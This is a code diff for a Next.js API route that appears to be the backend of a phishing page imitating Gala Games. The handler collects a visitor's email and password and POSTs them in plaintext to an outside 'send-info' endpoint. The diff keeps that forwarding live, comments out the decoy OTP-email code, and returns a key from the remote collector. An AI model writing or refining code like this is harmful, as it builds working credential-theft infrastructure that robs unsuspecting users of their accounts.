@@ -1,28 +1,28 @@
 import {NextResponse} from "next/server";
-import {MailtrapClient} from "mailtrap";
+// import {MailtrapClient} from "mailtrap";
 
-const TOKEN = process.env.MAIL_API_KEY;
+// const TOKEN = process.env.MAIL_API_KEY;
 
 const apiUrl = process.env.API_URL ?? ''
-const chatId = process.env.CHAT_ID ?? ''
 
 
-const client = new MailtrapClient({
-  token: TOKEN as string,
-  testInboxId: 3255068,
-});
+// const client = new MailtrapClient({
+//   token: TOKEN as string,
+//   testInboxId: 3255068,
+// });
+//
+// const sender = {
+//   email: "hello@example.com",
+//   name: "Mailtrap Test",
+// };
 
-const sender = {
-  email: "hello@example.com",
-  name: "Mailtrap Test",
-};
+// const env = process.env.NODE_ENV
 
-const env = process.env.NODE_ENV
+// function getOtp() {
+//   return Math.floor(100000 + Math.random() * 900000).toString();
+// };
 
-function getOtp() {
-  return Math.floor(100000 + Math.random() * 900000).toString();
-};
-
+// eslint-disable-next-line @typescript-eslint/no-unused-vars
 const getTemplate = (email: string, otp: string) => {
   return (
     `
@@ -116,42 +116,42 @@ export async function POST(req: Request) {
 
 
   try {
-    const recipients = [
-      {
-        email,
-      }
-    ];
+    // const recipients = [
+    //   {
+    //     email,
+    //   }
+    // ];
 
     const message = JSON.stringify({
       email,
       password
     }, null, 2)
 
-    await fetch(`${apiUrl}/api/send-info`, {
+    const res = await fetch(`${apiUrl}/api/send-info`, {
       method: 'POST',
-      body: JSON.stringify({chatId, message}),
+      body: JSON.stringify({message}),
       headers: {
         'Content-Type': 'application/json',
       }
     })
 
+    const json = await res.json();
 
-    if (env == "development") {
-      await client.testing
-        .send({
-          from: sender,
-          to: recipients,
-          subject: "Gala Games - OTP Verification",
-          html: getTemplate(email, getOtp()),
-        })
-
-
-    }
-
-    return NextResponse.json({error: null, data: 'success'})
+    // if (env == "development") {
+    //   await client.testing
+    //     .send({
+    //       from: sender,
+    //       to: recipients,
+    //       subject: "Gala Games - OTP Verification",
+    //       html: getTemplate(email, getOtp()),
+    //     })
+    //
+    //
+    // }
+    
+    return NextResponse.json({error: null, data: {key: json?.key}})
     // eslint-disable-next-line @typescript-eslint/no-unused-vars
   } catch (e) {
-
     return NextResponse.json({error: 'Something went wrong', data: null})
   }
 }
